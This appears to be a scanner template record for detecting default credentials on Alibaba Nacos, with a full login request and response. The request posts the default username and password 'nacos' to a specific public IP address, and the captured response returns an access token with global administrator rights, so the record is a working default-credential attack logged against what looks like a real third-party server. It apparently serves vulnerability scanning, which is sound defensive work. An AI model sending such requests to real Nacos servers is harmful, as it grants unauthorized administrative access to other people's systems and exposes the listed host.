info.name: Alibaba Nacos - Default Login
info.author: SleepingBag945
info.description: The default username and password for Nacos are both nacos.

req_resp.req:
POST /nacos/v1/auth/users/login HTTP/1.1
HOST: 101.132.115.102
User-Agent: Nacos-Server
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Host: 101.132.115.102:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=nacos&password=nacos
req_resp.resp:
HTTP/1.1 200
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
Content-Security-Policy: script-src 'self'
Authorization: Bearer AUTH_DISABLED
Content-Type: application/json
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:29:46 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"accessToken":"AUTH_DISABLED","tokenTtl":1742585387,"globalAdmin":true,"username":"nacos"}
